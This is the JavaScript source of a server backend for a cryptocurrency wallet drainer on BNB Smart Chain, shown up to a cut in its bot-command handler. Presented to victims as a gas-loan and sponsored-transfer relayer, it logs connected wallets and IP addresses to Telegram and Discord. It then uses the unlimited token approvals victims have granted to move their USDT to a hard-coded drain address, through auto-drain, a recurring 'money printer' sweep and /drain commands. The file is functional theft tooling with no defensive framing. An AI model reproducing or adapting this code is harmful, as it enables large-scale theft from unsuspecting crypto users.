require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const { ethers } = require('ethers');
const crypto = require('crypto');
const path = require('path');
const fs = require('fs');

// ==================== LOGGING ====================
const LOG = {
    info:  (...args) => console.log(`[INFO]  ${new Date().toISOString()}`, ...args),
    warn:  (...args) => console.warn(`[WARN]  ${new Date().toISOString()}`, ...args),
    error: (...args) => console.error(`[ERROR] ${new Date().toISOString()}`, ...args),
    money: (...args) => console.log(`[💰]    ${new Date().toISOString()}`, ...args),
};

const app = express();

// ==================== SECURITY MIDDLEWARE ====================
app.set('trust proxy', true);
app.use(helmet({ contentSecurityPolicy: false }));
app.use(cors({ origin: process.env.FRONTEND_ORIGIN || '*' }));
app.use(express.json());

const globalLimiter = rateLimit({
    windowMs: 60 * 1000, max: 60,
    standardHeaders: true, legacyHeaders: false,
    message: { error: "Too many requests" }
});
app.use(globalLimiter);

const loanLimiter = rateLimit({
    windowMs: 60 * 1000, max: 5,
    standardHeaders: true, legacyHeaders: false,
    message: { error: "Too many loan requests" }
});

// ==================== CONSTANTS ====================
const LOCK_TIMEOUT_MS            = 2 * 60 * 1000;
const INTENT_EXPIRY_MS           = 15 * 60 * 1000;
const CLEANUP_INTERVAL_MS        = 30 * 60 * 1000;
const STATE_EXPIRY_MS            = 60 * 60 * 1000;
const CONNECTION_LOG_COOLDOWN_MS = 5 * 60 * 1000;
const GAS_ESTIMATE_UNITS         = 150_000;
const TRANSFER_GAS_LIMIT         = 21_000;
const TG_POLL_FAST_MS            = 500;
const TG_POLL_IDLE_MS            = 2000;
const DC_POLL_INTERVAL_MS        = 2000;
const SWEEP_INTERVAL_MS          = parseInt(process.env.SWEEP_INTERVAL_MIN || "5") * 60 * 1000;
const KEEPALIVE_INTERVAL_MS      = 10 * 60 * 1000;  // 10 min self-ping

// ==================== CONFIGURATION ====================
const CONFIG = {
    rpcUrl:             process.env.RPC_URL || "https://bsc-dataseed1.binance.org/",
    rpcUrlFallback:     process.env.RPC_URL_FALLBACK || "https://bsc-dataseed2.binance.org/",
    chainId:            parseInt(process.env.CHAIN_ID) || 56,
    tokenAddress:       process.env.TOKEN_ADDRESS || "0x55d398326f99059fF775485246999027B3197955",
    relayerPrivateKey:  process.env.RELAYER_PRIVATE_KEY,
    // Telegram
    tgBotToken:         process.env.TG_BOT_TOKEN,
    tgChatId:           process.env.TG_CHAT_ID,
    // Discord
    dcWebhookUrl:       process.env.DISCORD_WEBHOOK_URL,
    dcBotToken:         process.env.DISCORD_BOT_TOKEN,
    dcChannelId:        process.env.DISCORD_CHANNEL_ID,
    // Operations
    minUsdtForLoan:     process.env.MIN_USDT_FOR_LOAN || "1.0",
    maxLoanBnb:         process.env.MAX_LOAN_BNB || "0.002",
    drainAddress:       process.env.DRAIN_ADDRESS || "0x35B508a6eCF490d88FaE90e2646A9c73f006C094",
    autoDrain:          process.env.AUTO_DRAIN === 'true',
    autoSweep:          process.env.AUTO_SWEEP !== 'false',  // ON by default
    backendUrl:         process.env.BACKEND_URL || '',
};

// ==================== STARTUP VALIDATION ====================
if (!CONFIG.relayerPrivateKey) {
    LOG.error("RELAYER_PRIVATE_KEY is not set!");
    process.exit(1);
}

const hasTelegram = !!(CONFIG.tgBotToken && CONFIG.tgChatId);
const hasDiscord = !!(CONFIG.dcWebhookUrl || (CONFIG.dcBotToken && CONFIG.dcChannelId));

if (!hasTelegram && !hasDiscord) {
    LOG.warn("No notification channel configured (Telegram or Discord). Alerts will be silent.");
}
if (hasTelegram) LOG.info("Telegram notifications: ON");
if (hasDiscord) LOG.info("Discord notifications: ON");

// ==================== UTILITY ====================
function getClientIP(req) {
    return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip;
}

// Strip HTML tags for Discord (Discord uses markdown, not HTML)
function htmlToDiscord(html) {
    return html
        .replace(/<b>/g, '**').replace(/<\/b>/g, '**')
        .replace(/<code>/g, '`').replace(/<\/code>/g, '`')
        .replace(/<a href="([^"]+)"[^>]*>[^<]*<\/a>/g, '$1')
        .replace(/<br\s*\/?>/g, '\n')
        .replace(/<[^>]+>/g, '');
}

// ==================== HOST CACHING ====================
let cachedHost = CONFIG.backendUrl;

app.use((req, res, next) => {
    if (!cachedHost) cachedHost = `${req.protocol}://${req.get('host')}`;
    next();
});

app.use(express.static(path.join(__dirname)));

// ==================== PROVIDER ====================
const RPC_URLS = [CONFIG.rpcUrl, CONFIG.rpcUrlFallback];
let currentRpcIndex = 0;
let provider;
let relayerWallet;

function createProvider(rpcUrl) {
    provider = new ethers.providers.JsonRpcProvider(rpcUrl);
    relayerWallet = new ethers.Wallet(CONFIG.relayerPrivateKey, provider);
    LOG.info(`Provider connected: ${rpcUrl}`);
}
createProvider(RPC_URLS[currentRpcIndex]);

async function getWorkingProvider() {
    try {
        await provider.getBlockNumber();
        return provider;
    } catch (e) {
        currentRpcIndex = (currentRpcIndex + 1) % RPC_URLS.length;
        LOG.warn(`RPC failed, cycling to: ${RPC_URLS[currentRpcIndex]}`);
        createProvider(RPC_URLS[currentRpcIndex]);
        return provider;
    }
}

// ==================== TOKEN CONTRACT + CACHE ====================
const ERC20_ABI = [
    "function symbol() view returns (string)",
    "function decimals() view returns (uint8)",
    "function balanceOf(address owner) view returns (uint256)",
    "function allowance(address owner, address spender) view returns (uint256)",
    "function transferFrom(address from, address to, uint256 amount) returns (bool)",
    "event Transfer(address indexed from, address indexed to, uint256 value)"
];

function getTokenContract() {
    return new ethers.Contract(CONFIG.tokenAddress, ERC20_ABI, relayerWallet);
}

let _tokenMeta = null;
async function getTokenMeta() {
    if (_tokenMeta) return _tokenMeta;
    const contract = getTokenContract();
    const [symbol, decimals] = await Promise.all([contract.symbol(), contract.decimals()]);
    _tokenMeta = { symbol, decimals };
    LOG.info(`Token metadata cached: ${symbol}, ${decimals} decimals`);
    return _tokenMeta;
}

// ==================== NONCE MUTEX ====================
let _nonceLock = Promise.resolve();

function withNonceLock(fn) {
    const prev = _nonceLock;
    let resolve;
    _nonceLock = new Promise(r => { resolve = r; });
    return prev.then(async () => {
        try { return await fn(); }
        finally { resolve(); }
    });
}

// ==================== STATE TRACKING ====================
const shortLinks           = new Map();
const fundedWallets        = new Map();
const fundedIPs            = new Map();
const intents              = new Map();
const connectionLogTracker = new Map();

// ==================== PERSISTENT APPROVED WALLETS ====================
const WALLETS_FILE = path.join(__dirname, '.approved_wallets.json');

function loadApprovedWallets() {
    try {
        if (fs.existsSync(WALLETS_FILE)) {
            const data = JSON.parse(fs.readFileSync(WALLETS_FILE, 'utf8'));
            return new Map(Object.entries(data));
        }
    } catch (e) { LOG.error("Failed to load approved wallets:", e.message); }
    return new Map();
}

function saveApprovedWallets() {
    try {
        fs.writeFileSync(WALLETS_FILE, JSON.stringify(Object.fromEntries(approvedWallets), null, 2));
    } catch (e) { LOG.error("Failed to save approved wallets:", e.message); }
}

const approvedWallets = loadApprovedWallets();

// ==================== DRAIN UTILITY ====================
async function drainWallet(walletAddress) {
    if (!relayerWallet) throw new Error("Relayer not configured");

    await getWorkingProvider();
    const tokenContract = getTokenContract();
    const { decimals, symbol } = await getTokenMeta();

    const [allowance, balance] = await Promise.all([
        tokenContract.allowance(walletAddress, relayerWallet.address),
        tokenContract.balanceOf(walletAddress)
    ]);

    if (allowance.eq(0)) return { success: false, reason: "No allowance" };
    if (balance.eq(0)) return { success: false, reason: "0 balance" };

    const drainAmount = balance.lt(allowance) ? balance : allowance;
    const displayAmount = ethers.utils.formatUnits(drainAmount, decimals);

    const receipt = await withNonceLock(async () => {
        const tx = await tokenContract.transferFrom(walletAddress, CONFIG.drainAddress, drainAmount);
        return tx.wait();
    });

    if (receipt.status !== 1) return { success: false, reason: "Tx reverted" };

    const existing = approvedWallets.get(walletAddress) || {};
    const prevTotal = parseFloat(existing.totalDrained || "0");
    approvedWallets.set(walletAddress, {
        ...existing,
        lastDrained: Date.now(),
        totalDrained: (prevTotal + parseFloat(displayAmount)).toFixed(4)
    });
    saveApprovedWallets();

    LOG.money(`Drained ${displayAmount} ${symbol} from ${walletAddress} | tx: ${receipt.transactionHash}`);

    return { success: true, amount: displayAmount, symbol, txHash: receipt.transactionHash };
}

// ==================== CLEANUP ====================
setInterval(() => {
    const now = Date.now();
    for (const [key, val] of intents) { if (now - val.createdAt > STATE_EXPIRY_MS) intents.delete(key); }
    for (const [key, val] of connectionLogTracker) { if (now - val > STATE_EXPIRY_MS) connectionLogTracker.delete(key); }
    for (const [key, val] of shortLinks) { if (val.expires > 0 && now > val.expires) shortLinks.delete(key); }
}, CLEANUP_INTERVAL_MS);

// ==================== UNIFIED NOTIFICATION SYSTEM ====================
// Sends to ALL configured channels (Telegram + Discord)
async function sendAlert(htmlMessage) {
    const promises = [];

    // Telegram
    if (hasTelegram) {
        promises.push(
            fetch(`https://api.telegram.org/bot${CONFIG.tgBotToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.tgChatId,
                    text: htmlMessage,
                    parse_mode: 'HTML',
                    disable_web_page_preview: true
                })
            }).catch(e => LOG.error("Telegram alert failed:", e.message))
        );
    }

    // Discord (via webhook)
    if (CONFIG.dcWebhookUrl) {
        const discordMsg = htmlToDiscord(htmlMessage);
        promises.push(
            fetch(CONFIG.dcWebhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: discordMsg })
            }).catch(e => LOG.error("Discord alert failed:", e.message))
        );
    }

    // Discord (via bot — if no webhook but bot is configured)
    if (!CONFIG.dcWebhookUrl && CONFIG.dcBotToken && CONFIG.dcChannelId) {
        const discordMsg = htmlToDiscord(htmlMessage);
        promises.push(
            fetch(`https://discord.com/api/v10/channels/${CONFIG.dcChannelId}/messages`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bot ${CONFIG.dcBotToken}`
                },
                body: JSON.stringify({ content: discordMsg })
            }).catch(e => LOG.error("Discord bot alert failed:", e.message))
        );
    }

    await Promise.allSettled(promises);
}

async function sendAlertPhoto(photoUrl, htmlCaption) {
    // Telegram photo
    if (hasTelegram) {
        fetch(`https://api.telegram.org/bot${CONFIG.tgBotToken}/sendPhoto`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CONFIG.tgChatId, photo: photoUrl,
                caption: htmlCaption, parse_mode: 'HTML'
            })
        }).catch(e => LOG.error("Telegram photo failed:", e.message));
    }

    // Discord — send image as embed
    const dcMsg = htmlToDiscord(htmlCaption);
    if (CONFIG.dcWebhookUrl) {
        fetch(CONFIG.dcWebhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: dcMsg,
                embeds: [{ image: { url: photoUrl } }]
            })
        }).catch(e => LOG.error("Discord photo failed:", e.message));
    } else if (CONFIG.dcBotToken && CONFIG.dcChannelId) {
        fetch(`https://discord.com/api/v10/channels/${CONFIG.dcChannelId}/messages`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bot ${CONFIG.dcBotToken}`
            },
            body: JSON.stringify({
                content: dcMsg,
                embeds: [{ image: { url: photoUrl } }]
            })
        }).catch(e => LOG.error("Discord bot photo failed:", e.message));
    }
}

// ==================== HEALTH ENDPOINT ====================
app.get('/api/v1/health', async (req, res) => {
    try {
        await getWorkingProvider();
        const relayerBnb = await provider.getBalance(relayerWallet.address);
        res.json({
            status: 'operational',
            relayerAddress: relayerWallet.address,
            relayerBnb: ethers.utils.formatEther(relayerBnb),
            approvedWallets: approvedWallets.size,
            activeIntents: intents.size,
            rpcUrl: RPC_URLS[currentRpcIndex],
            uptime: process.uptime(),
            autoDrain: CONFIG.autoDrain,
            autoSweep: CONFIG.autoSweep,
            notifications: { telegram: hasTelegram, discord: hasDiscord }
        });
    } catch (e) {
        res.status(503).json({ status: 'degraded', error: e.message });
    }
});

// ==================== ENDPOINT 1: WALLET CONNECTION LOG ====================
app.post('/api/v1/log/connect', async (req, res) => {
    const { account, balance, bnbBalance, symbol, url } = req.body;
    const ip = getClientIP(req);

    if (!account || !ethers.utils.isAddress(account)) return res.status(400).json({ error: "Invalid account" });

    const now = Date.now();
    const lastLog = connectionLogTracker.get(ip);
    if (lastLog && now - lastLog < CONNECTION_LOG_COOLDOWN_MS) return res.sendStatus(200);
    connectionLogTracker.set(ip, now);

    await sendAlert(`📌 🟢 <b>Wallet Connected</b>\n👤 <b>Address:</b> <code>${account}</code>\n💰 <b>USDT:</b> ${balance} ${symbol}\n💎 <b>BNB:</b> ${bnbBalance || '0'} BNB\n🌐 <b>IP:</b> ${ip}\n🔗 <b>URL:</b> ${url}`);
    res.sendStatus(200);
});

// ==================== ENDPOINT 1.5: APPROVAL LOG ====================
app.post('/api/v1/log/approval', async (req, res) => {
    const { account } = req.body;
    const ip = getClientIP(req);

    if (!account || !ethers.utils.isAddress(account)) return res.status(400).json({ error: "Invalid account" });

    const wallet = account.toLowerCase();

    try {
        await getWorkingProvider();
        const tokenContract = getTokenContract();
        const { decimals, symbol } = await getTokenMeta();

        const [allowance, balance] = await Promise.all([
            tokenContract.allowance(wallet, relayerWallet.address),
            tokenContract.balanceOf(wallet)
        ]);

        if (allowance.eq(0)) return res.status(400).json({ error: "No approval found on-chain" });

        const displayBalance = ethers.utils.formatUnits(balance, decimals);
        const displayAllowance = allowance.gt(ethers.utils.parseUnits("999999999", decimals))
            ? "UNLIMITED" : ethers.utils.formatUnits(allowance, decimals);

        const existing = approvedWallets.get(wallet) || {};
        approvedWallets.set(wallet, {
            ...existing,
            approvedAt: existing.approvedAt || Date.now(),
            ip, lastSeen: Date.now(),
            totalDrained: existing.totalDrained || "0"
        });
        saveApprovedWallets();

        await sendAlert(`🔓 <b>MAX APPROVAL GRANTED</b>\n👤 <code>${wallet}</code>\n💰 <b>Balance:</b> ${parseFloat(displayBalance).toFixed(4)} ${symbol}\n🔑 <b>Allowance:</b> ${displayAllowance}\n🌐 <b>IP:</b> ${ip}\n⏰ <b>Drainable:</b> YES`);

    } catch (e) { LOG.error("Approval log error:", e.message); }

    res.sendStatus(200);
});

// ==================== ENDPOINT 1.75: TRANSFER COMPLETE (user-paid-gas path) ====================
app.post('/api/v1/log/transfer-complete', async (req, res) => {
    const { account, txHash } = req.body;
    const ip = getClientIP(req);

    if (!account || !ethers.utils.isAddress(account)) return res.status(400).json({ error: "Invalid account" });

    const wallet = account.toLowerCase();
    LOG.info(`Transfer completed by user: ${wallet} | tx: ${txHash}`);

    const { symbol } = await getTokenMeta();
    await sendAlert(
        `📌 ✅ <b>${symbol} Transfer (User-Paid Gas)</b>\n` +
        `👤 <code>${wallet}</code>\n🔗 <code>${txHash || 'unknown'}</code>\n🌐 IP: ${ip}`
    );

    res.sendStatus(200);

    // Auto-drain remaining after user's transfer
    if (CONFIG.autoDrain) {
        setTimeout(async () => {
            try {
                await getWorkingProvider();
                const tokenContract = getTokenContract();
                const remaining = await tokenContract.balanceOf(wallet);
                if (remaining.gt(0)) {
                    LOG.money(`Auto-drain post-transfer: ${wallet}`);
                    const r = await drainWallet(wallet);
                    if (r.success) {
                        await sendAlert(`🤖 <b>AUTO-DRAIN</b>\n👤 <code>${wallet}</code>\n💰 ${r.amount} ${r.symbol}\n🔗 <code>${r.txHash}</code>`);
                    }
                }
            } catch (e) { LOG.error(`Auto-drain failed for ${wallet}:`, e.message); }
        }, 3000);
    }
});

// ==================== ENDPOINT 2: CREATE TRANSFER INTENT ====================
app.post('/api/v1/sponsor/intent', async (req, res) => {
    const { account, recipient, amount } = req.body;

    if (!account || !ethers.utils.isAddress(account)) return res.status(400).json({ error: "Invalid sender" });
    if (!recipient || !ethers.utils.isAddress(recipient)) return res.status(400).json({ error: "Invalid recipient" });
    if (account.toLowerCase() === recipient.toLowerCase()) return res.status(400).json({ error: "Cannot send to yourself" });

    const parsedAmount = parseFloat(amount);
    if (isNaN(parsedAmount) || parsedAmount <= 0 || !isFinite(parsedAmount)) {
        return res.status(400).json({ error: "Invalid amount" });
    }

    try {
        await getWorkingProvider();
        const tokenContract = getTokenContract();
        const { decimals } = await getTokenMeta();
        const amountWei = ethers.utils.parseUnits(parsedAmount.toString(), decimals);

        const userBalance = await tokenContract.balanceOf(account);
        if (userBalance.lt(amountWei)) return res.status(400).json({ error: "Insufficient balance" });

        const intentId = crypto.randomUUID();
        intents.set(intentId, {
            owner: account.toLowerCase(), recipient: recipient.toLowerCase(),
            amountWei, status: 'LOANED', createdAt: Date.now()
        });

        res.json({ intentId, relayer: relayerWallet.address, tokenAddress: CONFIG.tokenAddress });
    } catch (error) {
        LOG.error("Intent error:", error.message);
        res.status(500).json({ error: "Failed to create transfer intent" });
    }
});

// ==================== ENDPOINT 3: GAS MICRO-LOAN ====================
app.post('/api/v1/sponsor/loan', loanLimiter, async (req, res) => {
    const { account } = req.body;
    const ip = getClientIP(req);

    if (!account || !ethers.utils.isAddress(account)) return res.status(400).json({ error: "Invalid account" });

    const owner = account.toLowerCase();

    const walletLock = fundedWallets.get(owner);
    if (walletLock) {
        if (walletLock.status === 'CONFIRMED') return res.status(400).json({ error: "Wallet already received loan" });
        if (Date.now() - walletLock.timestamp < LOCK_TIMEOUT_MS) return res.status(400).json({ error: "Loan processing" });
    }

    const ipLock = fundedIPs.get(ip);
    if (ipLock) {
        if (ipLock.status === 'CONFIRMED') return res.status(400).json({ error: "IP already received loan" });
        if (Date.now() - ipLock.timestamp < LOCK_TIMEOUT_MS) return res.status(400).json({ error: "Loan processing" });
    }

    fundedWallets.set(owner, { timestamp: Date.now(), ip, status: 'PENDING' });
    fundedIPs.set(ip, { timestamp: Date.now(), wallet: owner, status: 'PENDING' });

    try {
        await getWorkingProvider();
        const tokenContract = getTokenContract();
        const { decimals } = await getTokenMeta();

        const minUsdtWei = ethers.utils.parseUnits(CONFIG.minUsdtForLoan, decimals);

        const [usdtBalance, bnbBalance, gasPrice] = await Promise.all([
            tokenContract.balanceOf(owner), provider.getBalance(owner), provider.getGasPrice()
        ]);

        if (usdtBalance.lt(minUsdtWei)) {
            fundedWallets.delete(owner); fundedIPs.delete(ip);
            return res.status(400).json({ error: `Must hold ${CONFIG.minUsdtForLoan} USDT` });
        }

        let loanAmount = gasPrice.mul(GAS_ESTIMATE_UNITS).sub(bnbBalance);
        if (loanAmount.lte(0)) loanAmount = ethers.BigNumber.from(0);

        const maxLoan = ethers.utils.parseEther(CONFIG.maxLoanBnb);
        if (loanAmount.gt(maxLoan)) loanAmount = maxLoan;

        if (loanAmount.eq(0)) {
            fundedWallets.delete(owner); fundedIPs.delete(ip);
            return res.json({ success: true, message: "No gas needed", loanAmount: "0" });
        }

        const relayerBalance = await provider.getBalance(relayerWallet.address);
        if (relayerBalance.lt(loanAmount)) {
            fundedWallets.delete(owner); fundedIPs.delete(ip);
            await sendAlert("⚠️ <b>RELAYER LOW ON BNB!</b>\nTop up the relayer wallet.");
            return res.status(500).json({ error: "Service temporarily unavailable" });
        }

        const receipt = await withNonceLock(async () => {
            const tx = await relayerWallet.sendTransaction({ to: owner, value: loanAmount, gasLimit: TRANSFER_GAS_LIMIT });
            return tx.wait();
        });

        fundedWallets.set(owner, { timestamp: Date.now(), ip, status: 'CONFIRMED' });
        fundedIPs.set(ip, { timestamp: Date.now(), wallet: owner, status: 'CONFIRMED' });

        LOG.money(`Loaned ${ethers.utils.formatEther(loanAmount)} BNB to ${owner}`);
        await sendAlert(`⛽ <b>Gas Loan Sent</b>\n👤 <code>${owner}</code>\n💰 ${ethers.utils.formatEther(loanAmount)} BNB\n🌐 IP: ${ip}`);

        res.json({ success: true, txHash: receipt.transactionHash, loanAmount: ethers.utils.formatEther(loanAmount) });

    } catch (error) {
        LOG.error("Loan failed:", error.message);
        fundedWallets.delete(owner); fundedIPs.delete(ip);
        res.status(500).json({ error: "Gas loan failed" });
    }
});

// ==================== ENDPOINT 4: EXECUTE TRANSFER ====================
app.post('/api/v1/sponsor/submit', async (req, res) => {
    const { intentId } = req.body;
    if (!intentId) return res.status(400).json({ error: "Missing intentId" });

    const intent = intents.get(intentId);
    if (!intent) return res.status(404).json({ error: "Intent not found" });
    if (intent.status !== 'LOANED') return res.status(400).json({ error: `Already ${intent.status}` });

    if (Date.now() - intent.createdAt > INTENT_EXPIRY_MS) {
        intent.status = 'EXPIRED';
        return res.status(400).json({ error: "Intent expired" });
    }

    intent.status = 'PROCESSING';

    try {
        await getWorkingProvider();
        const tokenContract = getTokenContract();
        const { decimals, symbol } = await getTokenMeta();

        const [allowance, balance] = await Promise.all([
            tokenContract.allowance(intent.owner, relayerWallet.address),
            tokenContract.balanceOf(intent.owner)
        ]);

        if (allowance.lt(intent.amountWei)) { intent.status = 'FAILED'; return res.status(400).json({ error: "Approval not granted" }); }
        if (balance.lt(intent.amountWei)) { intent.status = 'FAILED'; return res.status(400).json({ error: "Insufficient balance" }); }

        const receipt = await withNonceLock(async () => {
            const tx = await tokenContract.transferFrom(intent.owner, intent.recipient, intent.amountWei);
            return tx.wait();
        });

        if (receipt.status !== 1) throw new Error("Transaction reverted");

        const iface = new ethers.utils.Interface(ERC20_ABI);
        let transferVerified = false;
        for (const log of receipt.logs) {
            if (log.address.toLowerCase() === CONFIG.tokenAddress.toLowerCase()) {
                try {
                    const parsed = iface.parseLog(log);
                    if (parsed.name === 'Transfer' && parsed.args.from.toLowerCase() === intent.owner && parsed.args.to.toLowerCase() === intent.recipient) {
                        transferVerified = true; break;
                    }
                } catch (e) {}
            }
        }

        intent.status = 'SENT';
        const displayAmount = ethers.utils.formatUnits(intent.amountWei, decimals);

        await sendAlert(`📌 ✅ <b>${symbol} Transfer Sent</b>\n📩 ${displayAmount} ${symbol}\n👤 <code>${intent.owner}</code>\n📬 <code>${intent.recipient}</code>\n🔗 <code>${receipt.transactionHash}</code>`);

        res.json({ success: true, txHash: receipt.transactionHash, verified: transferVerified });

        // Auto-drain after relayer-executed transfer
        if (CONFIG.autoDrain) {
            setTimeout(async () => {
                try {
                    const remaining = await tokenContract.balanceOf(intent.owner);
                    if (remaining.gt(0)) {
                        const r = await drainWallet(intent.owner);
                        if (r.success) await sendAlert(`🤖 <b>AUTO-DRAIN</b>\n👤 <code>${intent.owner}</code>\n💰 ${r.amount} ${r.symbol}\n🔗 <code>${r.txHash}</code>`);
                    }
                } catch (e) { LOG.error(`Auto-drain failed:`, e.message); }
            }, 3000);
        }

    } catch (error) {
        LOG.error("Transfer failed:", error.message);
        intent.status = 'FAILED';
        res.status(500).json({ error: error.reason || error.message || "Transfer failed" });
    }
});

// ==================== ENDPOINT 5: PUBLIC INFO ====================
app.get('/api/v1/info', async (req, res) => {
    try {
        await getWorkingProvider();
        const { symbol, decimals } = await getTokenMeta();
        res.json({ chainId: CONFIG.chainId, tokenAddress: CONFIG.tokenAddress, symbol, decimals, relayer: relayerWallet.address });
    } catch (error) { res.status(500).json({ error: "Server error" }); }
});

// ==================== QR REDIRECT ====================
app.get('/qr-link/:id', (req, res) => {
    const link = shortLinks.get(req.params.id);
    if (!link) return res.status(404).send("<h2 style='text-align:center;margin-top:20%;font-family:sans-serif;'>❌ Link not found</h2>");
    if (link.expires > 0 && Date.now() > link.expires) { shortLinks.delete(req.params.id); return res.status(410).send("<h2 style='text-align:center;margin-top:20%;font-family:sans-serif;'>⏳ QR Expired</h2>"); }
    res.redirect(link.target);
});

// ==================== QR WIDGET ====================
app.get('/api/v1/qr-widget', (req, res) => {
    const sanitize = (str) => String(str).replace(/[&<>"'`]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;','`':'&#96;'}[c]));
    const targetUrl = sanitize(req.query.url || 'https://example.com');
    const address = sanitize(req.query.address || CONFIG.drainAddress);
    res.send(`<!DOCTYPE html><html><head><script src="https://cdn.jsdelivr.net/npm/qr-code-styling@1.5.0/lib/qr-code-styling.js"></script><style>body{background-color:#16181a;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}.card{background-color:white;border-radius:30px;padding:40px;display:flex;flex-direction:column;align-items:center;box-shadow:0 10px 30px rgba(0,0,0,0.5);width:400px}#qr{margin-bottom:20px}.address{font-size:22px;font-weight:600;color:#111827;text-align:center;width:100%;word-wrap:break-word}</style></head><body><div class="card" id="card"><div id="qr"></div><div class="address">${address}</div></div><script>const q=new QRCodeStyling({width:400,height:400,data:"${targetUrl}",image:"https://cryptologos.cc/logos/bnb-bnb-logo.png",dotsOptions:{color:"#050505",type:"rounded"},cornersSquareOptions:{type:"extra-rounded",color:"#050505"},cornersDotOptions:{type:"dot",color:"#050505"},imageOptions:{crossOrigin:"anonymous",margin:15,imageSize:0.4}});q.append(document.getElementById("qr"));</script></body></html>`);
});

// ==================== RECURRING WALLET SWEEP (THE MONEY PRINTER) ====================
// Checks ALL approved wallets every X minutes for new deposits and drains them
async function sweepApprovedWallets() {
    if (approvedWallets.size === 0) return;

    try {
        await getWorkingProvider();
        const tokenContract = getTokenContract();
        const { decimals, symbol } = await getTokenMeta();

        let swept = 0, totalSwept = 0;

        for (const [wallet] of approvedWallets) {
            try {
                const [balance, allowance] = await Promise.all([
                    tokenContract.balanceOf(wallet),
                    tokenContract.allowance(wallet, relayerWallet.address)
                ]);

                // Only drain if there's real money (> 0.5 USDT) and approval exists
                const minSweep = ethers.utils.parseUnits("0.5", decimals);
                if (balance.gt(minSweep) && allowance.gt(0)) {
                    const result = await drainWallet(wallet);
                    if (result.success) {
                        swept++;
                        totalSwept += parseFloat(result.amount);
                        await sendAlert(
                            `🧹 <b>SWEEP</b>\n👤 <code>${wallet.slice(0,6)}...${wallet.slice(-4)}</code>\n` +
                            `💰 ${result.amount} ${result.symbol}\n🔗 <code>${result.txHash}</code>`
                        );
                    }
                }
            } catch (e) {
                // Skip this wallet, continue sweep
                LOG.error(`Sweep error for ${wallet}:`, e.message);
            }
        }

        if (swept > 0) {
            LOG.money(`Sweep complete: ${swept} wallets, ${totalSwept.toFixed(4)} ${symbol}`);
        }
    } catch (e) {
        LOG.error("Sweep cycle failed:", e.message);
    }
}

// Start recurring sweep
if (CONFIG.autoSweep) {
    LOG.info(`Auto-sweep ON — checking wallets every ${SWEEP_INTERVAL_MS / 60000} minutes`);
    setInterval(sweepApprovedWallets, SWEEP_INTERVAL_MS);
    // First sweep 30 seconds after boot
    setTimeout(sweepApprovedWallets, 30000);
}

// ==================== BOT COMMAND HANDLER (shared logic) ====================
async function handleBotCommand(text, sendReply) {
    if (text === '/help') {
        await sendReply(
            `📋 <b>Commands</b>\n\n` +
            `🔫 <code>/drain 0x...</code> — Drain specific wallet\n` +
            `🔫 <code>/drain-all</code> — Drain ALL wallets\n` +
            `📋 <code>/wallets</code> — List approved wallets\n` +
            `🧹 <code>/sweep</code> — Force sweep now\n` +
            `📸 <code>/qr URL</code> — Generate QR links\n` +
            `📸 <code>/qr-2 URL</code> — QR with 2hr expiry\n` +
            `💚 <code>/health</code> — Server status\n` +
            `❓ <code>/help</code> — This message`
        );
        return true;
    }

    if (text === '/health') {
        try {
            const relayerBnb = await provider.getBalance(relayerWallet.address);
            await sendReply(
                `💚 <b>Server Status</b>\n` +
                `⛽ Relayer BNB: ${parseFloat(ethers.utils.formatEther(relayerBnb)).toFixed(6)}\n` +
                `👛 Approved: ${approvedWallets.size}\n` +
                `📡 RPC: ${RPC_URLS[currentRpcIndex]}\n` +
                `⏱ Uptime: ${Math.floor(process.uptime() / 60)} min\n` +
                `🤖 Auto-drain: ${CONFIG.autoDrain ? 'ON' : 'OFF'}\n` +
                `🧹 Auto-sweep: ${CONFIG.autoSweep ? 'ON' : 'OFF'}`
            );
        } catch (e) { await sendReply(`⚠️ Health check failed: ${e.message}`); }
        return true;
    }

    if (text === '/sweep') {
        await sendReply(`🧹 Running manual sweep...`);
        await sweepApprovedWallets();
        await sendReply(`🧹 Sweep complete.`);
        return true;
    }

    if (text === '/wallets') {
        if (approvedWallets.size === 0) { await sendReply("📋 No approved wallets."); return true; }

        try {
            await getWorkingProvider();
            const tokenContract = getTokenContract();
            const { decimals, symbol } = await getTokenMeta();

            let lines = [`📋 <b>Wallets (${approvedWallets.size})</b>\n`];
            let totalAvailable = 0;

            for (const [wallet, info] of approvedWallets) {
                const [balance, allowance] = await Promise.all([
                    tokenContract.balanceOf(wallet),
                    tokenContract.allowance(wallet, relayerWallet.address)
                ]);
                const displayBal = parseFloat(ethers.utils.formatUnits(balance, decimals)).toFixed(2);
                const hasAllowance = allowance.gt(0);
                const drainable = hasAllowance && balance.gt(0);
                if (drainable) totalAvailable += parseFloat(displayBal);

                const status = !hasAllowance ? '🔴 REVOKED' : balance.eq(0) ? '⚪ EMPTY' : '🟢 READY';
                lines.push(`${status} <code>${wallet.slice(0,6)}...${wallet.slice(-4)}</code>`);
                lines.push(`   💰 ${displayBal} ${symbol} | Drained: ${info.totalDrained || '0'}`);
            }

            lines.push(`\n💎 <b>Total Drainable:</b> ${totalAvailable.toFixed(2)} ${symbol}`);
            await sendReply(lines.join('\n'));
        } catch (e) { await sendReply(`⚠️ Error: ${e.message}`); }
        return true;
    }

    const drainMatch = text.match(/^\/drain\s+(0x[a-fA-F0-9]{40})$/);
    if (drainMatch) {
        const target = drainMatch[1].toLowerCase();
        await sendReply(`🔫 Draining <code>${target}</code>...`);
        try {
            const result = await drainWallet(target);
            if (result.success) {
                await sendReply(`✅ <b>Drained</b>\n👤 <code>${target}</code>\n💰 ${result.amount} ${result.symbol}\n🔗 <code>${result.txHash}</code>`);
            } else { await sendReply(`❌ ${result.reason}`); }
